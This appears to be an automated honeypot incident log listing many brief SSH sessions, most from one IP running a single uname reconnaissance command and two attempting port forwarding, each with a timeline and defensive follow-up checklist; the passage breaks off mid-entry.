### 🔴 HIGH · IR-b98e9e9fbed1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:36` | `cowrie.session.connect` |
| `2026-07-28 04:56:36` | `cowrie.client.version` |
| `2026-07-28 04:56:36` | `cowrie.client.kex` |
| `2026-07-28 04:56:37` | `cowrie.login.success` |
| `2026-07-28 04:56:37` | `cowrie.session.params` |
| `2026-07-28 04:56:37` | `cowrie.command.input` |
| `2026-07-28 04:56:38` | `cowrie.log.closed` |
| `2026-07-28 04:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb871789a67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:43` | `cowrie.session.connect` |
| `2026-07-28 04:56:44` | `cowrie.client.version` |
| `2026-07-28 04:56:44` | `cowrie.client.kex` |
| `2026-07-28 04:56:45` | `cowrie.login.success` |
| `2026-07-28 04:56:46` | `cowrie.session.params` |
| `2026-07-28 04:56:46` | `cowrie.command.input` |
| `2026-07-28 04:56:46` | `cowrie.log.closed` |
| `2026-07-28 04:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d309f2e805b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:51` | `cowrie.session.connect` |
| `2026-07-28 04:56:51` | `cowrie.client.version` |
| `2026-07-28 04:56:51` | `cowrie.client.kex` |
| `2026-07-28 04:56:52` | `cowrie.login.success` |
| `2026-07-28 04:56:52` | `cowrie.session.params` |
| `2026-07-28 04:56:52` | `cowrie.command.input` |
| `2026-07-28 04:56:53` | `cowrie.log.closed` |
| `2026-07-28 04:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5981468c70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:56 |
| **Last Seen** | 2026-07-28 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:56:57` | `cowrie.session.connect` |
| `2026-07-28 04:56:57` | `cowrie.client.version` |
| `2026-07-28 04:56:57` | `cowrie.client.kex` |
| `2026-07-28 04:56:58` | `cowrie.login.success` |
| `2026-07-28 04:56:59` | `cowrie.session.params` |
| `2026-07-28 04:56:59` | `cowrie.command.input` |
| `2026-07-28 04:56:59` | `cowrie.log.closed` |
| `2026-07-28 04:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03f13d3d5e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:03` | `cowrie.session.connect` |
| `2026-07-28 04:57:03` | `cowrie.client.version` |
| `2026-07-28 04:57:03` | `cowrie.client.kex` |
| `2026-07-28 04:57:04` | `cowrie.login.success` |
| `2026-07-28 04:57:06` | `cowrie.session.params` |
| `2026-07-28 04:57:06` | `cowrie.command.input` |
| `2026-07-28 04:57:06` | `cowrie.log.closed` |
| `2026-07-28 04:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4e717b5a07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:08` | `cowrie.session.connect` |
| `2026-07-28 04:57:09` | `cowrie.client.version` |
| `2026-07-28 04:57:09` | `cowrie.client.kex` |
| `2026-07-28 04:57:11` | `cowrie.login.success` |
| `2026-07-28 04:57:14` | `cowrie.session.params` |
| `2026-07-28 04:57:14` | `cowrie.command.input` |
| `2026-07-28 04:57:14` | `cowrie.log.closed` |
| `2026-07-28 04:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd12e366d21f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:14` | `cowrie.session.connect` |
| `2026-07-28 04:57:15` | `cowrie.client.version` |
| `2026-07-28 04:57:15` | `cowrie.client.kex` |
| `2026-07-28 04:57:16` | `cowrie.login.success` |
| `2026-07-28 04:57:18` | `cowrie.session.params` |
| `2026-07-28 04:57:18` | `cowrie.command.input` |
| `2026-07-28 04:57:18` | `cowrie.log.closed` |
| `2026-07-28 04:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ac42e6247ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:20` | `cowrie.session.connect` |
| `2026-07-28 04:57:20` | `cowrie.client.version` |
| `2026-07-28 04:57:20` | `cowrie.client.kex` |
| `2026-07-28 04:57:22` | `cowrie.login.success` |
| `2026-07-28 04:57:23` | `cowrie.session.params` |
| `2026-07-28 04:57:23` | `cowrie.command.input` |
| `2026-07-28 04:57:24` | `cowrie.log.closed` |
| `2026-07-28 04:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719650c00d64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:25` | `cowrie.session.connect` |
| `2026-07-28 04:57:26` | `cowrie.client.version` |
| `2026-07-28 04:57:26` | `cowrie.client.kex` |
| `2026-07-28 04:57:28` | `cowrie.login.success` |
| `2026-07-28 04:57:30` | `cowrie.session.params` |
| `2026-07-28 04:57:30` | `cowrie.command.input` |
| `2026-07-28 04:57:30` | `cowrie.log.closed` |
| `2026-07-28 04:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3daba8810644

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:32` | `cowrie.session.connect` |
| `2026-07-28 04:57:32` | `cowrie.client.version` |
| `2026-07-28 04:57:32` | `cowrie.client.kex` |
| `2026-07-28 04:57:33` | `cowrie.login.success` |
| `2026-07-28 04:57:34` | `cowrie.session.params` |
| `2026-07-28 04:57:34` | `cowrie.command.input` |
| `2026-07-28 04:57:34` | `cowrie.log.closed` |
| `2026-07-28 04:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40cbd7717a91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:38` | `cowrie.session.connect` |
| `2026-07-28 04:57:38` | `cowrie.client.version` |
| `2026-07-28 04:57:38` | `cowrie.client.kex` |
| `2026-07-28 04:57:39` | `cowrie.login.success` |
| `2026-07-28 04:57:40` | `cowrie.session.params` |
| `2026-07-28 04:57:40` | `cowrie.command.input` |
| `2026-07-28 04:57:40` | `cowrie.log.closed` |
| `2026-07-28 04:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3186f7fabb8

| Field | Detail |
|---|---|
| **Source IP** | `190.90.79[.]29` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:43` | `cowrie.session.connect` |
| `2026-07-28 04:57:43` | `cowrie.client.version` |
| `2026-07-28 04:57:43` | `cowrie.client.kex` |
| `2026-07-28 04:57:45` | `cowrie.login.success` |
| `2026-07-28 04:57:45` | `cowrie.direct-tcpip.request` |
| `2026-07-28 04:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.90.79[.]29` to AbuseIPDB if not already reported
- [ ] Block `190.90.79[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c079877ee45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:44` | `cowrie.session.connect` |
| `2026-07-28 04:57:44` | `cowrie.client.version` |
| `2026-07-28 04:57:44` | `cowrie.client.kex` |
| `2026-07-28 04:57:44` | `cowrie.login.success` |
| `2026-07-28 04:57:45` | `cowrie.session.params` |
| `2026-07-28 04:57:45` | `cowrie.command.input` |
| `2026-07-28 04:57:45` | `cowrie.log.closed` |
| `2026-07-28 04:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff667b50df4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:49` | `cowrie.session.connect` |
| `2026-07-28 04:57:49` | `cowrie.client.version` |
| `2026-07-28 04:57:49` | `cowrie.client.kex` |
| `2026-07-28 04:57:51` | `cowrie.login.success` |
| `2026-07-28 04:57:53` | `cowrie.session.params` |
| `2026-07-28 04:57:53` | `cowrie.command.input` |
| `2026-07-28 04:57:54` | `cowrie.log.closed` |
| `2026-07-28 04:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e689f2e6bb5

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:50` | `cowrie.session.connect` |
| `2026-07-28 04:57:51` | `cowrie.client.version` |
| `2026-07-28 04:57:51` | `cowrie.client.kex` |
| `2026-07-28 04:57:53` | `cowrie.login.success` |
| `2026-07-28 04:57:54` | `cowrie.direct-tcpip.request` |
| `2026-07-28 04:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d3c3adae1da

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:57 |
| **Last Seen** | 2026-07-28 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:57:55` | `cowrie.session.connect` |
| `2026-07-28 04:57:55` | `cowrie.client.version` |
| `2026-07-28 04:57:55` | `cowrie.client.kex` |
| `2026-07-28 04:57:57` | `cowrie.login.success` |
| `2026-07-28 04:57:58` | `cowrie.session.params` |
| `2026-07-28 04:57:58` | `cowrie.command.input` |
| `2026-07-28 04:57:59` | `cowrie.log.closed` |
| `2026-07-28 04:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492ee4005292

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:01` | `cowrie.session.connect` |
| `2026-07-28 04:58:01` | `cowrie.client.version` |
| `2026-07-28 04:58:01` | `cowrie.client.kex` |
| `2026-07-28 04:58:02` | `cowrie.login.success` |
| `2026-07-28 04:58:03` | `cowrie.session.params` |
| `2026-07-28 04:58:03` | `cowrie.command.input` |
| `2026-07-28 04:58:03` | `cowrie.log.closed` |
| `2026-07-28 04:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a820e32d0224

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:06` | `cowrie.session.connect` |
| `2026-07-28 04:58:06` | `cowrie.client.version` |
| `2026-07-28 04:58:06` | `cowrie.client.kex` |
| `2026-07-28 04:58:09` | `cowrie.login.success` |
| `2026-07-28 04:58:12` | `cowrie.session.params` |
| `2026-07-28 04:58:12` | `cowrie.command.input` |
| `2026-07-28 04:58:12` | `cowrie.log.closed` |
| `2026-07-28 04:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d8f6969e62

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:12` | `cowrie.session.connect` |
| `2026-07-28 04:58:12` | `cowrie.client.version` |
| `2026-07-28 04:58:12` | `cowrie.client.kex` |
| `2026-07-28 04:58:15` | `cowrie.login.success` |
| `2026-07-28 04:58:16` | `cowrie.session.params` |
| `2026-07-28 04:58:16` | `cowrie.command.input` |
| `2026-07-28 04:58:17` | `cowrie.log.closed` |
| `2026-07-28 04:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a27b6ee0a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:17` | `cowrie.session.connect` |
| `2026-07-28 04:58:18` | `cowrie.client.version` |
| `2026-07-28 04:58:18` | `cowrie.client.kex` |
| `2026-07-28 04:58:20` | `cowrie.login.success` |
| `2026-07-28 04:58:21` | `cowrie.session.params` |
| `2026-07-28 04:58:21` | `cowrie.command.input` |
| `2026-07-28 04:58:21` | `cowrie.log.closed` |
| `2026-07-28 04:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06a7f16c0285

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:24` | `cowrie.session.connect` |
| `2026-07-28 04:58:24` | `cowrie.client.version` |
| `2026-07-28 04:58:24` | `cowrie.client.kex` |
| `2026-07-28 04:58:25` | `cowrie.login.success` |
| `2026-07-28 04:58:26` | `cowrie.session.params` |
| `2026-07-28 04:58:26` | `cowrie.command.input` |
| `2026-07-28 04:58:26` | `cowrie.log.closed` |
| `2026-07-28 04:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5428c59d057

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:30` | `cowrie.session.connect` |
| `2026-07-28 04:58:30` | `cowrie.client.version` |
| `2026-07-28 04:58:30` | `cowrie.client.kex` |
| `2026-07-28 04:58:32` | `cowrie.login.success` |
| `2026-07-28 04:58:33` | `cowrie.session.params` |
| `2026-07-28 04:58:33` | `cowrie.command.input` |
| `2026-07-28 04:58:34` | `cowrie.log.closed` |
| `2026-07-28 04:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48529b6c8d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:36` | `cowrie.session.connect` |
| `2026-07-28 04:58:37` | `cowrie.client.version` |
| `2026-07-28 04:58:37` | `cowrie.client.kex` |
| `2026-07-28 04:58:38` | `cowrie.login.success` |
| `2026-07-28 04:58:39` | `cowrie.session.params` |
| `2026-07-28 04:58:39` | `cowrie.command.input` |
| `2026-07-28 04:58:40` | `cowrie.log.closed` |
| `2026-07-28 04:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67028ae5812c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:42` | `cowrie.session.connect` |
| `2026-07-28 04:58:43` | `cowrie.client.version` |
| `2026-07-28 04:58:43` | `cowrie.client.kex` |
| `2026-07-28 04:58:44` | `cowrie.login.success` |
| `2026-07-28 04:58:45` | `cowrie.session.params` |
| `2026-07-28 04:58:45` | `cowrie.command.input` |
| `2026-07-28 04:58:45` | `cowrie.log.closed` |
| `2026-07-28 04:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69dd16f491a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:49` | `cowrie.session.connect` |
| `2026-07-28 04:58:49` | `cowrie.client.version` |
| `2026-07-28 04:58:49` | `cowrie.client.kex` |
| `2026-07-28 04:58:50` | `cowrie.login.success` |
| `2026-07-28 04:58:51` | `cowrie.session.params` |
| `2026-07-28 04:58:51` | `cowrie.command.input` |
| `2026-07-28 04:58:52` | `cowrie.log.closed` |
| `2026-07-28 04:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d8f93477949

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 04:58 |
| **Last Seen** | 2026-07-28 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 04:58:55` | `cowrie.session.connect` |
| `2026-07-28 04:58:55` | `cowrie.client.version` |
| `2026-07-28 04:58:55` | `cowrie.client.kex` |
| `2026-07-28 04:58:56` | `cowrie.login.success` |
| `2026-07-28 04:58:58` | `cowrie.session.params` |
